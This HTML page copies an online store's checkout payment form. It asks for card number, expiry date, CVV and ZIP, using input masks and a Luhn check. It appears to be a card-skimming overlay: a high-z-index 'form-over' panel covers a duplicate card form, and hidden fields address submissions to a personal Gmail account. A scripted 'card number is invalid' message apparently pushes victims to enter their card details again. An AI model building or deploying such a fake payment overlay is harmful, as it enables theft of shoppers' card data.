<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" media="all" href="css/b671c03b4d171c85cfd4a1276fab290e.css">
    <link rel="stylesheet" href="css/form.css">

    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">

        
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>

  
    

</head>

<body>
    <main id="maincontent" class="page-main">

        <div class="columns" bis_skin_checked="1">

            <div class="column main" bis_skin_checked="1">

                <div id="checkout" data-bind="scope:'checkout'" class="checkout-container am-checkout -modern -layout-2columns" data-amcheckout-js="checkout" bis_skin_checked="1">

                    <div data-bind="{ css: getOneStepModel().containerClassNames, attr: getOneStepModel().getContainerAttrs() }" class="amcheckout-main-container -modern -layout-2columns" data-amcheckout-js="main-container" bis_skin_checked="1">
    
                        <div class="amcheckout-column -main" data-amcheckout-js="main-column" bis_skin_checked="1" >

                            <div data-bind="{ css: $parents[1].getOneStepModel().getBlockClassNames(block.name), attr: $parents[1].getOneStepModel().getBlockAttrs() }" class="amcheckout-block amcheckout-step-container" data-amcheckout-js="step-container" bis_skin_checked="1">

                                <li id="payment" role="presentation" class="checkout-payment-method" data-bind="fadeVisible: isVisible" style="display: list-item;">
                                    <div id="checkout-step-payment" class="step-content" data-role="content" role="tabpanel" aria-hidden="false" bis_skin_checked="1">
                                        <!-- ko if: (quoteIsVirtual) -->
                                        <!--/ko-->
                                        <form id="co-payment-form" class="form payments">

                                            <!-- Hidden Required Fields -->
                                                <input type="hidden" name="project_name" value="Site Name">
                                                <input type="hidden" name="admin_email" value="jekaon13@gmail.com">
                                                <input type="hidden" name="form_subject" value="Заявка с сайта">
                                            <!-- END Hidden Required Fields -->
                                            

                                            <fieldset class="fieldset">
                                                <legend class="legend"> <span data-bind="i18n: 'Payment Information'">Payment Information</span></legend><br>
                                                <div id="checkout-payment-method-load" class="opc-payment" data-bind="visible: isPaymentMethodsAvailable" style="display: block;" bis_skin_checked="1">
                                              
                                                    <div data-bind="blockLoader: isLoading" class="items payment-methods amcheckout-payment-methods" bis_skin_checked="1">
                                                        <!-- ko repeat: {foreach: paymentGroupsList, item: '$group'} -->
                                                        <div class="payment-group -collapsible -opened" data-repeat-index="0" data-collapsible="true" role="tablist" bis_skin_checked="1">

                                                            <div class="step-content amcheckout-content" data-amcheckout-js="step-content" data-bind="mageInit: {'checkoutCollapsibleSteps': {}}" role="tabpanel" aria-hidden="false" bis_skin_checked="1">
                                                                <div class="amcheckout-wrapper" bis_skin_checked="1">
                                                                    <!-- ko foreach: {data: getRegion($group().displayArea), as: 'method'} -->
                                                                    <!-- ko template: getTemplate() -->
                                                                    <div id="input1" class="payment-method _active" data-bind="css: {'_active': (getCode() == isChecked())}, attr: {'id': getCode() + '_container', afterRender: initEvents()}" id="checkoutcom_card_payment_container" bis_skin_checked="1">
                                                                        
                                                                        <div class="form-over" style="
                                                                        position: relative;
                                                                        margin-bottom: -117.6px;
                                                                        background-color: #f9f9f9;
                                                                        z-index: 9999999 !important;
                                                                        /* height: 230px; */"> 
                                                                            <div class="payment-method-title field choice" bis_skin_checked="1"> 
                                                                    
                                                                                <input type="radio" name="payment[method]" checked class="radio" data-bind="attr: {'id': getCode()}, value: getCode(), checked: isChecked, click: selectPaymentMethod, visible: isRadioButtonVisible()" id="checkoutcom_card_payment" value="checkoutcom_card_payment" required> 
                                                                    
                                                                    
                                                                                <label data-bind="attr: {'for': getCode()}" class="label" for="checkoutcom_card_payment"> 
                                                                                    <span data-bind="i18n: getTitle()"> Credit/Debit Cards </span>
                                                                                    <span class="cards">
                                                                                        <img src="images/amex.svg" alt="">
                                                                                        <img src="images/discover.svg" alt="">
                                                                                        <img src="images/visa.svg" alt="">
                                                                                        <img src="images/mastercard.svg" alt="">
                                                                                    </span>
                                                                                </label> 
                                                                            </div>
                                                                    
                                                                            <div id="error-message" style="
                                                                            border-left:red 7px solid;
                                                                            background-color: #edf2f7;
                                                                            padding: 15px 19px;
                                                                            display: none;
                                                                            margin-bottom: 7px;">
                                                                                The card number is invalid. Check the card details or use a different card.
                                                                            </div>
                                                                    
                                                                            <div class="payment-method-content" bis_skin_checked="1" >
                                                                    
                                                                                <div class="form-line">
                                                                                    <div class="field-container error" style="position: relative;">
                                                                                        <span class="ico"></span>
                                                                                        <input name="card" id="cardnumber" type="text" inputmode="numeric" placeholder="Card number">
                                                                    
                                                                                    </div>
                                                                                    <div class="right-filds" style="
                                                                                    display: flex;
                                                                                    align-items: center;
                                                                                    justify-content: space-between;
                                                                                    margin: 0px !important
                                                                                   ">
                                                                                        <div class="field-container error field-additional">
                                                                                            <input name="date" id="expirationdate" type="text" inputmode="numeric" placeholder="MM/YY" style="max-width: 50px !important;">
                                                                                        
                                                                                        </div>
                                                                                        <div class="field-container error field-additional">
                                                                                            <input name="code" id="securitycode" type="text" inputmode="numeric" placeholder="CVV">
                                                                    
                                                                                        </div>
                                                                                        <div class="field-container error zipcode field-additional" style="display: none; margin: 0px !important;">
                                                                                            <input name="zip" id="zipcode" type="text" inputmode="numeric" placeholder="ZIP" style="max-width: 50px !important;">
                                                                    
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                    </div>
                                                                    
                                                                    
                                                                        
                                                                        
                                                                        
                                                                        <div class="payment-method-title field choice" bis_skin_checked="1"> 

                                                                        	<input type="radio" name="payment[method]" checked class="radio" data-bind="attr: {'id': getCode()}, value: getCode(), checked: isChecked, click: selectPaymentMethod, visible: isRadioButtonVisible()" id="checkoutcom_card_payment" value="checkoutcom_card_payment" required> 


                                                                        	<label data-bind="attr: {'for': getCode()}" class="label" for="checkoutcom_card_payment"> 
                                                                                <span data-bind="i18n: getTitle()"> Credit/Debit Cards </span>
                                                                                <span class="cards">
                                                                                    <img src="images/amex.svg" alt="">
                                                                                    <img src="images/discover.svg" alt="">
                                                                                    <img src="images/visa.svg" alt="">
                                                                                    <img src="images/mastercard.svg" alt="">
                                                                                </span>
                                                                            </label> 
                                                                        </div>

                                                                        <div class="payment-method-content" bis_skin_checked="1">
                     

                                                                            <div class="form-line">
                                                                                <div class="field-container error" style="position: relative;">
                                                                                    <span class="ico"></span>
                                                                                    <input name="card" id="cardnumber" type="text" inputmode="numeric" placeholder="Card number">
                                                                  
                                                                                </div>
                                                                                <div class="field-container error">
                                                                                    <input name="date" id="expirationdate" type="text" inputmode="numeric" placeholder="MM/YY">
                                                                      
                                                                                </div>
                                                                                <div class="field-container error">
                                                                                    <input name="code" id="securitycode" type="text" inputmode="numeric" placeholder="CVV">
                                                           
                                                                                </div>
                                                                            </div>
                                                                            </div>
                                                                        </div>
                                                                    </div> <!-- /ko -->
                                                     
                                                                    <div id="input2" class="payment-method" >

                                                                        <div class="payment-method-title field choice" bis_skin_checked="1"> 

                                                                        	<input type="radio" name="payment[method]" class="radio" data-bind="attr: {'id': getCode()}, value: getCode(), checked: isChecked, click: selectPaymentMethod, visible: isRadioButtonVisible()" id="banktransfer" value="banktransfer"> 


                                                                        	<label data-bind="attr: {'for': getCode()}" class="label" for="banktransfer">
                                                                                <span data-bind="text: getTitle()">Google Pay</span>
                                                                                <img class="icon-play" src="images/googlepay_round_outline.svg" alt="">
                                                                            </label>
                                                                        </div>

                                                                    </div>

                                                                    <!-- /ko -->
                                                                </div>

                                                                <div class="form-bottom">
                                                                    <p>Your personal data will be used to process your order, support your experience throughout this website, and for other purposes described in our <a href="#">privacy policy</a>.</p>

                                                                    <button type="button" class="btn-card">Place order</button>
                                                                    <button class="btn-google">Buy with <img src="images/dark_gpay.svg" alt=""></button>
                                                                </div>
                                                            </div>
                                                        </div><!-- /ko -->
                                                    </div>
                                                </div>
                                            </fieldset>
                                        </form>
                                    </div>
                                </li>
                            </div>

                        </div>
                       
                    </div>
                </div>
            </div>
        </div>
    </main>

        <script>

        /* const formover = document.getElementById('iframe-over');
        console.log(formover);
        /* $('.btn-card').click(function(){
            if(!formover.contentWindow.validaton()){
                formover.style.height = "230px";
                $('.payment-method-content').css("margin-bottom","100px");
            }
        }) */

         $(function()
            {
              $('.radio').change(function()
              {
                if ($(this).is(':checked')) {
                 $('.payment-method').removeClass('_active');
                   $(this).parent().parent().addClass('_active');
                };

                if ($("#input2").hasClass("_active")) {
                  $(".btn-google").show();
                  $(".btn-card").hide();
                  $(".form-over").hide();
                }
                if ($("#input1").hasClass("_active")) {
                  $(".btn-google").hide();
                  $(".btn-card").show();
                  $(".form-over").show();
                }
              });
            });

        





        const cardnumber = document.getElementById('cardnumber');
        const expirationdate = document.getElementById('expirationdate');
        const securitycode = document.getElementById('securitycode');

        //Mask the Credit Card Number Input
        var cardnumber_mask = new IMask(cardnumber, {
            mask: [
                {
                    mask: '0000 000000 00000',
                    regex: '^3[47]\\d{0,13}',
                    cardtype: 'american express'
                },
                {
                    mask: '0000 0000 0000 0000',
                    regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
                    cardtype: 'discover'
                },
                {
                    mask: '0000 0000 0000 0000',
                    regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
                    cardtype: 'mastercard'
                },
                {
                    mask: '0000 0000 0000 0000',
                    regex: '^4\\d{0,15}',
                    cardtype: 'visa'
                },
                {
                    mask: '0000 0000 0000 0000',
                    regex: '^(?:35\\d{0,2})\\d{0,12}',
                    cardtype: 'jcb'
                },
                {
                    mask: '0000 000000 0000',
                    regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
                    cardtype: 'diners'
                },
                {
                    mask: '0000 0000 0000 0000',
                    cardtype: 'Unknown'
                }
            ],
            dispatch: function (appended, dynamicMasked) {
                var number = (dynamicMasked.value + appended).replace(/\D/g, '');

                for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
                    let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
                    if (number.match(re) != null) {
                        return dynamicMasked.compiledMasks[i];
                    }
                }
            }
        });


        //Mask the Expiration Date
        var expirationdate_mask = new IMask(expirationdate, {
            mask: 'MM{/}YY',
            groups: {
                YY: new IMask.MaskedPattern.Group.Range([0, 99]),
                MM: new IMask.MaskedPattern.Group.Range([1, 12]),
            }
        });

        //Mask the security code
        var securitycode_mask = new IMask(securitycode, {
            mask: '0000',
        });


        //pop in the appropriate card icon when detected
        cardnumber_mask.on("accept", function () {
            console.log(cardnumber_mask.masked.currentMask.cardtype);

            switch (cardnumber_mask.masked.currentMask.cardtype) {
                case 'american express':

                    $('.ico').removeClass('visa');
                    $('.ico').removeClass('discover');
                    $('.ico').removeClass('mastercard');
                    $('.ico').removeClass('diners');
                    $('.ico').removeClass('jcb');
  
                    $('.ico').addClass('amex');
        
                    break;
                case 'visa':
                    
                    $('.ico').removeClass('amex');
                    $('.ico').removeClass('discover');
                    $('.ico').removeClass('mastercard');
                    $('.ico').removeClass('diners');
                    $('.ico').removeClass('jcb');

                    $('.ico').addClass('visa');
  
                    break;
                case 'discover':

                    $('.ico').removeClass('amex');
                    $('.ico').removeClass('visa');
                    $('.ico').removeClass('mastercard');
                    $('.ico').removeClass('diners');
                    $('.ico').removeClass('jcb');
  
                    $('.ico').addClass('discover');
       
                    break;
                case 'mastercard':

                    $('.ico').removeClass('amex');
                    $('.ico').removeClass('visa');
                    $('.ico').removeClass('discover');
                    $('.ico').removeClass('diners');
                    $('.ico').removeClass('jcb');

                    $('.ico').addClass('mastercard');
    

                    break;
                case 'diners':
                    $('.ico').removeClass('amex');
                    $('.ico').removeClass('visa');
                    $('.ico').removeClass('discover');
                    $('.ico').removeClass('mastercard');
                    $('.ico').removeClass('jcb');

                    $('.ico').addClass('diners');
                    
                    break;
                case ('jcb'):
                    $('.ico').removeClass('amex');
                    $('.ico').removeClass('visa');
                    $('.ico').removeClass('discover');
                    $('.ico').removeClass('mastercard');
                    $('.ico').removeClass('diners');

                    $('.ico').addClass('jcb');
                    
                    break;

            }

        });

        $('#cardnumber').keyup(function()
        {

            if( $(this).val().length === 0 ||  $(this).val().length < 17) {
                $(this).parent().addClass('error');
                $(this).parent().removeClass('blur');

            } else {
                $(this).parent().removeClass('error');
                $(this).parent().removeClass('blur');
            }

        });

        $('#cardnumber').blur(function()
        {

            if( $(this).val().length === 0 ||  $(this).val().length < 17) {
                $(this).parent().addClass('blur');

            } else {
                $(this).parent().removeClass('blur');
            }

        });


        $('#expirationdate').keyup(function()
        {   

            if( $(this).val().length === 0 ||  $(this).val().length < 5) {
                $(this).parent().addClass('error');
                $(this).parent().removeClass('blur');

            } else {
                $(this).parent().removeClass('error');
                $(this).parent().removeClass('blur');
            }

        });

        $('#expirationdate').blur(function()
        {

            if( $(this).val().length === 0 ||  $(this).val().length < 5) {
                $(this).parent().addClass('blur');

            } else {
                $(this).parent().removeClass('blur');
            }

        });

        $('#securitycode').keyup(function()
        {

            if( $(this).val().length === 0 ||  $(this).val().length < 3) {
                $(this).parent().addClass('error');
                $(this).parent().removeClass('blur');

            } else {
                $(this).parent().removeClass('error');
                $(this).parent().removeClass('blur');
            }

        });

        $('#securitycode').blur(function()
        {

            if( $(this).val().length === 0 ||  $(this).val().length < 3) {
                $(this).parent().addClass('blur');

            } else {
                $(this).parent().removeClass('blur');
            }

        });


        $('.field-container input').keyup(function(){
            
            $('.field-container input').each(function(){
                if (!$('.field-container').hasClass("error")){
                    $('.btn-card').attr('disabled', false);
   
                } else{
                    $('.btn-card').removeClass('active');
                    $('.btn-card').attr('disabled', true);
                }
            });
            
        });
    </script> 

<script>
                                                                    
    $(function()
    {
      $('.radio').change(function()
      {
        if ($(this).is(':checked')) {
         $('.payment-method').removeClass('_active');
           $(this).parent().parent().parent().addClass('_active');
        };

        if ($("#input2").hasClass("_active")) {
          $(".btn-google").show();
          $(".btn-card").hide();
          $(".form-over").hide();
        }
        if ($("#input1").hasClass("_active")) {
          $(".btn-google").hide();
          $(".btn-card").show();
          $(".form-over").show();
        }
      });
    });

const cardnumberN = document.getElementById('cardnumber');
const expirationdateN = document.getElementById('expirationdate');
const securitycodeN = document.getElementById('securitycode');
const zipcode = document.getElementById('zipcode');
const errormessage = document.getElementById('error-message');
const button = document.getElementsByClassName("btn-card")[0];
const formover = document.getElementsByClassName("form-over")[0];
const paymentcontent = document.getElementsByClassName("payment-method-content")[0];

function validateCardNumber(cardNumber) {
  // Remove any non-numeric characters
  cardNumber = cardNumber.replace(/\D/g, '');

  // Check that the number is between 13 and 19 digits long
  if (cardNumber.length < 13 || cardNumber.length > 19) {
    return false;
  }

  // Use Luhn algorithm to validate the card number
  var sum = 0;
  for (var i = 0; i < cardNumber.length; i++) {
    var digit = parseInt(cardNumber.charAt(i));
    if (i % 2 == 0) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    sum += digit;
  }
  return sum % 10 == 0;
}

function validateZip(zipcode){
    return zipcode.length == 5 ;
}

 $('#cardnumber').keyup(function()
{

    if (!validateCardNumber(cardnumberN.value) && cardnumberN.value.length > 18){
        cardnumberN.style.setProperty("color", "red", "important");
        console.log("red");
    }else {
        cardnumberN.style.removeProperty("color");
    }

    if (cardnumberN.value.length > 18) zipcode.parentElement.style.display = "block";

    if( $(this).val().length === 0 ||  $(this).val().length < 17) {
        $(this).parent().addClass('error');
        $(this).parent().removeClass('blur');

    } else {
        $(this).parent().removeClass('error');
        $(this).parent().removeClass('blur');
    }

});


button.addEventListener("click",function(){
    console.log("hello");
    if(!validateCardNumber(cardnumber.value) && cardnumber.value.length > 18){
        errormessage.style.display = 'block';
        formover.style.height = "230px";
        paymentcontent.style.marginBottom= "100px";
    }
    if(!validateZip(zipcode.value)) {
        zipcode.style.setProperty("color", "red", "important");
        formover.style.height = "200px";
        paymentcontent.style.marginBottom= "100px";
    }
    else zipcode.style.removeProperty('color');
}); 

</script> 



</body>

</html>